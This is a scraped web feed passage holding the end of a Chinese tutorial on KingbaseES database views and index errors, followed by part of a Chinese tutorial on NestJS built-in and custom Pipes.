<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> vw_sys_user_basic;
<span class="hljs-comment">-- 查询2024年用户视图，按创建时间排序</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> vw_sys_user_2024 <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<ul>
<li><strong>效果</strong>：返回的结果和查原表筛选后的数据一样，但看不到那些被隐藏的列，比如在<code>vw_sys_user_basic</code>里就看不到<code>email</code>列。</li>
</ul>
<h5 data-id="heading-29">3.4.2 示例2：修改视图定义（CREATE OR REPLACE）</h5>
<p>要是想调整视图的筛选条件或者包含的列，比如把<code>vw_sys_user_2024</code>改成包含2023年的数据，不用删了视图重新建，直接用<code>CREATE OR REPLACE</code>修改就行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">VIEW</span> vw_sys_user_2024 <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, email, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2023-01-01 00:00:00'</span> 
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01 00:00:00'</span>;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\d+ vw_sys_user_2024</code>，确认视图定义已经更新了就行。</li>
</ul>
<h5 data-id="heading-30">3.4.3 示例3：删除视图（DROP VIEW）</h5>
<p>要是某个视图不用了，就把它删掉。放心，<strong>删除视图不会影响原表数据</strong>，只是把视图的定义删掉了。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：DROP VIEW IF EXISTS 视图名;</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">VIEW</span> IF <span class="hljs-keyword">EXISTS</span> vw_sys_user_report;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\dv</code>，确认视图已经删掉了就可以。</li>
</ul>
<h4 data-id="heading-31">3.5 视图使用注意事项（新手避坑指南）</h4>
<ol>
<li>视图修改有不少限制，就算没加<code>READ ONLY</code>，只要有下面这些情况，也没法改数据：
<ul>
<li>视图里包含<code>DISTINCT</code>（去重）、<code>GROUP BY</code>（分组）、<code>HAVING</code>（筛选分组）；</li>
<li>视图里有聚合函数，比如<code>COUNT</code>、<code>SUM</code>；</li>
<li>视图是从多个表关联（<code>JOIN</code>）来的；</li>
</ul>
</li>
<li>要是原表被删了，比如<code>sys_user</code>表没了，那对应的视图就成了“无效视图”，再查这个视图就会报错“relation does not exist”。</li>
<li>性能方面也得注意，要是视图很复杂，包含多表关联或者聚合操作，它的查询效率就看原表有没有索引。所以原表里那些相关的字段，比如多表<code>JOIN</code>时用到的关联列，一定要提前建好索引。</li>
</ol>
<h3 data-id="heading-32">四、常见问题排查：索引与视图的高频报错</h3>
<h4 data-id="heading-33">问题1：创建索引报错“重复的键名”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  duplicate key name "idx_sys_user_phone"
</code></pre>
<p><strong>原因</strong>：这明显是同名的索引已经存在了，比如之前已经创建过<code>idx_sys_user_phone</code>。
<strong>解决方案</strong>：</p>
<ul>
<li>先执行<code>\di</code>看看索引名，确认是不是真的重复了；</li>
<li>要是想重新建这个索引，先把旧的删掉，执行<code>DROP INDEX idx_sys_user_phone;</code>，然后再建新的。</li>
</ul>
<h4 data-id="heading-34">问题2：查询视图报错“关系对象不存在”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  relation "vw_sys_user_basic" does not exist
</code></pre>
<p><strong>原因</strong>：</p>
<ol>
<li>要么是视图名拼错了，比如把<code>vw_sys_user_basic</code>写成了<code>vw_sys_user_basci</code>；</li>
<li>要么是视图所在的模式不在搜索路径里，比如视图在<code>test_schema</code>模式下，但当前的搜索路径是<code>public</code>。
<strong>解决方案</strong>：</li>
</ol>
<ul>
<li>先检查视图名拼写对不对，执行<code>\dv</code>确认一下正确的名称；</li>
<li>要么切换到视图所在的模式，执行<code>SET search_path TO test_schema, public;</code>；要么查询的时候用“模式名.视图名”的全称，比如<code>SELECT * FROM test_schema.vw_sys_user_basic;</code>。</li>
</ul>
<h4 data-id="heading-35">问题3：通过视图修改数据报错“无法更新只读视图”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  cannot update a read-only view "vw_sys_user_report"
</code></pre>
<p><strong>原因</strong>：这是因为创建视图的时候加了<code>WITH READ ONLY</code>选项，就是禁止修改的。
<strong>解决方案</strong>：</p>
<ul>
<li>
<p>要是想允许修改，就重新创建视图，把<code>WITH READ ONLY</code>去掉：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">VIEW</span> vw_sys_user_report <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, phone, create_time <span class="hljs-keyword">FROM</span> sys_user;
</code></pre>
</li>
<li>
<p>不过要注意，重新创建之前得确认这个视图没有其他修改限制，比如不含<code>GROUP BY</code>、聚合函数这些。</p>
</li>
</ul>
<h3 data-id="heading-36">五、总结：索引与视图的配合使用</h3>
<p>今天把索引和视图的核心操作都讲透了，核心要点总结一下：</p>
<ol>
<li><strong>索引</strong>：主要管“查询速度”，得根据查询场景选普通、唯一还是复合索引，别建太多，还得定时重建优化性能；</li>
<li><strong>视图</strong>：主要管“查询简化和权限控制”，能把复杂逻辑封装起来，隐藏敏感数据，但要注意修改限制和对原表的依赖；</li>
<li><strong>配合使用</strong>：视图的查询速度和原表的索引有关系，比如给<code>vw_sys_user_2024</code>视图对应的<code>sys_user</code>原表建个<code>create_time</code>索引，视图的查询效率能提升不少。</li>
</ol>
<p>学会了索引和视图，你在KingbaseES里查数据就能又快又方便了。下一篇咱就讲“用户与权限管理”，让数据库访问更安全，实现“不同用户看不同数据”的精细控制。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何自定义 Pipe？]]></title>    <link>https://juejin.cn/post/7602259669707358234</link>    <guid>https://juejin.cn/post/7602259669707358234</guid>    <pubDate>2026-02-03T02:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669707358234" data-draft-id="7599917711794012170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何自定义 Pipe？"/> <meta itemprop="keywords" content="前端,NestJS,Node.js"/> <meta itemprop="datePublished" content="2026-02-03T02:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端付豪"/> <meta itemprop="url" content="https://juejin.cn/user/1741228277763278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何自定义 Pipe？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1741228277763278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端付豪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:42:46.000Z" title="Tue Feb 03 2026 02:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Pipe 是在参数传给 Controller 之前做一些验证和转换的，有 多个内置的 Pipe 可以直接用</p>
<p>Nest 一次请求的顺序是：</p>
<pre><code class="hljs language-scss" lang="scss">Middleware
  ↓
Guard
  ↓
Interceptor (before)
  ↓
Pipe   ✅（就在这里）
  ↓
Controller handler
  ↓
Interceptor (after)
  ↓
ExceptionFilter
</code></pre>
<p>👉 <strong>Pipe 发生在 handler 真正被调用之前，而且是“参数级别”执行</strong></p>
<h2 data-id="heading-0">Pipe 的接口定义</h2>
<pre><code class="hljs language-r" lang="r">export interface PipeTransform<span class="hljs-operator">&lt;</span><span class="hljs-built_in">T</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">any</span><span class="hljs-punctuation">,</span> R <span class="hljs-operator">=</span> <span class="hljs-built_in">any</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">{</span>
  transform<span class="hljs-punctuation">(</span>value<span class="hljs-operator">:</span> <span class="hljs-built_in">T</span><span class="hljs-punctuation">,</span> metadata<span class="hljs-operator">:</span> ArgumentMetadata<span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> R;
<span class="hljs-punctuation">}</span>
</code></pre>
<p><code>ArgumentMetadata</code> 是关键：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ArgumentMetadata</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'body'</span> | <span class="hljs-string">'query'</span> | <span class="hljs-string">'param'</span> | <span class="hljs-string">'custom'</span>;
  metatype?: <span class="hljs-title class_">Type</span>&lt;<span class="hljs-built_in">any</span>&gt;;
  data?: <span class="hljs-built_in">string</span>;
}
</code></pre>
<p>也就是说，Pipe 能知道：</p>
<ul>
<li>这个参数来自哪里（body / query / param）</li>
<li>DTO 是什么 class</li>
<li>装饰器里写的是 <code>@Body('id')</code> 还是整个 body</li>
</ul>
<p>内置的 Pipe 有这些：</p>
<ul>
<li>ValidationPipe</li>
<li>ParseIntPipe</li>
<li>ParseBoolPipe</li>
<li>ParseArrayPipe</li>
<li>ParseUUIDPipe</li>
<li>DefaultValuePipe</li>
<li>ParseEnumPipe</li>
<li>ParseFloatPipe</li>
<li>ParseFilePipe</li>
</ul>
<p>看一下使用</p>
<pre><code class="hljs language-sql" lang="sql">nest <span class="hljs-keyword">new</span> pipe<span class="hljs-operator">-</span><span class="hljs-keyword">inner</span> <span class="hljs-operator">-</span>p npm
</code></pre>
<p>ParseIntPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65cb8d85ae4446358d46a1627722c3f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=NR%2F2YFkHLr8K5ZaXJsvK63bYsXE%3D" alt="image.png" loading="lazy"/></p>
<p>如果可以转正常展示</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50fcc495bde42bf90d1750aa20b8b3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Lac9Ai%2FR2pECjm1qr89nDjeR7Vw%3D" alt="image.png" loading="lazy"/></p>
<p>如果不可以转 报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca7927ce7f444f729bfdb7585942dd07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=ImH1ukExtVLd%2BUgCauHk%2F45ZUgo%3D" alt="image.png" loading="lazy"/></p>
<p>状态码和信息也可以改</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba13e1fe6750492cb595f0b8862199b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=KrQGZuBs4ZMJ%2F%2BtpkFNpXePG6%2FE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfbf0abd48e0421fa818187c061bc4ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=8PL5qxrcNp4ppKO7BfgaF67BPt4%3D" alt="image.png" loading="lazy"/></p>
<p>可以自己抛一个异常出来，然后让 exception filter 处理</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7750fc6740f44e61974fc0aa43d000bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=K9khwHum0NTY4DVTWAW%2FPq3H7Eg%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f46c012f181f488eb9ecb38bb9cb4ec5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=y8yimWfYOFix3ikcrw0dHUN6xLs%3D" alt="image.png" loading="lazy"/></p>
<p>ParseFloatPipe 是把参数转换为 float 类型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ca7c655bc624e4b9876abf97880c838~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=04Xwac2e%2FeTARc%2FcbeAVUVEIETE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84e2ff5a29974aba8a296369122fa25c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=O4DbH0GyVvNyvlmBLSM8hcVR7go%3D" alt="image.png" loading="lazy"/></p>
<p>也可以 new ParseFloatPipe 的形式，传入 errorHttpStatusCode 和 exceptionFactory</p>
<p>ParseBoolPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6f6812aaab9451c9bec3f72fa31b942~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Cx0cOMr%2FkaSmJyAefAKrVKj4bPk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0f6d6d3799d44608e44af1f74fa7655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Q%2FweJ0swMPgSjKZsihfY5qGjRAA%3D" alt="image.png" loading="lazy"/></p>
<p>ParseArrayPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d809d6527e1b413ebc5e9d28df11f09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=PG2V%2B2e7IE20sSsdHkFvzM8VC10%3D" alt="image.png" loading="lazy"/></p>
<p>需要安装</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/245f6867406a4b68ac05e14806a78d9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=DLeoP6sVv0dul8oO2Co1DbYCqrA%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">npm install -D <span class="hljs-keyword">class</span>-validator <span class="hljs-keyword">class</span>-transformer
</code></pre>
<p>没有转为数字</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dfdc00592ba452bbac7080833599310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=wbywhvmWVhliMwlNlC%2BsA%2FvfPmI%3D" alt="image.png" loading="lazy"/></p>
<p>指定 item 的类型</p>
<p>这样就把数组每一项处理为 number</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c6dfa16440546a2aef21d0011e4d8e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=DE1aEz%2BDTkjrY%2F%2FQ2z%2Bn%2B1eq9i0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0da3387d863645db8ba7d2c6cabf4c79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=tP7Kc0Eo9hkM97FIbnPbfURPU0A%3D" alt="image.png" loading="lazy"/></p>
<p>ParseEnumPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/194ba572039543c09d487648d1c17bb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=7YI2j2MwsPrWPdVCikKJWkDKKvs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b0769c791e44936b42b066483586d55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=AaXLna%2BoK1vbjoXjpuO3rzWG1yI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6700ea7e96a485a907de3745edea495~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=%2FC%2BBHVOExyDckceAsytI0d3Fuqk%3D" alt="image.png" loading="lazy"/></p>
<p>参数不是枚举值内</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0964f7bdb440a997111abde1c9f590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=%2FlvSofEbulE9mMQcTdEjP3l1E9M%3D" alt="image.png" loading="lazy"/></p>
<p>ParseUUIDPipe</p>
<p>UID 是一种随机生成的几乎不可能重复的字符串，做 id</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd347332075e4a84882266650fb05149~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=FN3C1fSAqbEHlhaBu59jxHf1Tys%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77e075322bed4b13af551a9c9a824635~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=kNcOd758dobyjncRGCrpy%2FH%2BK3g%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce79004c1b11486aaaba2316f5daaec8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=CMAV81o6xz6aGmGWf1ltVQVHcns%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe3067b71349439c86d2c98127a707b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=FytHVEwIiGVUhh7ggXRci6fQ2S0%3D" alt="image.png" loading="lazy"/></p>
<p>不是 uuid 会报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be2caca925514f238544b308c29eef39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=rkXPFVbT0wAltwRm5WdKQEmc0J0%3D" alt="image.png" loading="lazy"/></p>
<p>DefaultValuePipe 设置默认值</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85b39c793849405b84c18a6d80cd86f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=HQ3PZ9VRo8OlSMHj%2BTrXYBAaAf8%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97d28c91b9b243cfb514b1243d269bbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=lmHew2u8AuyJ9p9tFOGUnHcS53w%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">实现个 Pipe</h2>
<p>自己写一个 pipe 也很简单，实现 PipeTransform 接口的 transform 方法，返回值就是传给 handler 的值</p>
<pre><code class="hljs language-css" lang="css">nest g pipe aaa <span class="hljs-attr">--flat</span> <span class="hljs-attr">--no-spec</span>
</code></pre>
<p>生成一个 pipe，打印下参数值，返回 aaa</p>
